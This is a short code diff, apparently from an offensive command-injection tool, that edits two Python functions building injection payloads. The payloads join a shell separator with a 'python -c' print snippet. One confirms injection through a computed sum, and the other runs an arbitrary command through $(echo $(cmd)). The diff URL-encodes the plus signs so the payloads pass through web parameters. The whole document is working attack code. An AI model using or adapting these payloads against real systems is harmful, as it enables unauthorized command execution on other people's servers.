@@ -30,8 +30,8 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
   payload = (separator + 
-            " python -c \"print '" + TAG + "' + '" + str(int(randv1 + randv2)) + "' + '" + TAG + "' + '" + TAG + "'\""
-             ) 
+            " python -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
+             )
   return payload
 
 # ---------------------------------------------
@@ -51,7 +51,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, TAG, cmd):
   payload = (separator + 
-            " python -c \"print'" + TAG + "'+'" + TAG + "'+'$(echo $("+cmd+"))'+'"+ TAG + "'+'" + TAG + "'\""
+            " python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(echo $("+cmd+"))'%2B'"+ TAG + "'%2B'" + TAG + "'\""
             )
   return payload
 
